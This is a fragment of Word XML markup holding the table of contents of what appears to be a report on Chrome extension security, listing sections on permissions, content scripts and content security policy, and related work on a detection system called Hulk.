          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071491 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="16A45649" w14:textId="4E8E2DA4" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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492" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>1.1</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Chrome Extension Composition</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_Toc523071492 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="398EE1EC" w14:textId="1D27C280" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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493" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>1.2</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Installing Extensions</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_Toc523071493 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="397DE570" w14:textId="37BB69E0" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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494" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>1.3</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Access Control Settings</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_Toc523071494 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2DD7D733" w14:textId="40592C9A" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071495" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>1.3.1</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Permissions</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_Toc523071495 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4C678D61" w14:textId="5F976788" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071496" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>1.3.2</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Content Scripts</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_Toc523071496 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3BA79183" w14:textId="48DCC753" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071497" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>1.3.3</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Background Pages</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_Toc523071497 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="26862F2D" w14:textId="01AF65DE" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071498" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>1.3.4</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Content Security Policy</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_Toc523071498 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="04CC89FF" w14:textId="056E802A" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="480"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071499" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>2.</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>RELATED WORK</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071499 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>17</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35D6BB67" w14:textId="07EE5E6B" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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00" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>2.1</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Hulk Architecture</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_Toc523071500 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>17</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="09E02800" w14:textId="0D95E51D" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071501" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>2.1.1</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>HoneyPages</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_Toc523071501 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>17</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="776B49B6" w14:textId="1D22D505" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071502" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>2.1.2</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Fuzzer</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_Toc523071502 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>17</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="69F7B06B" w14:textId="4A9D0798" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071503" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>2.1.3</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
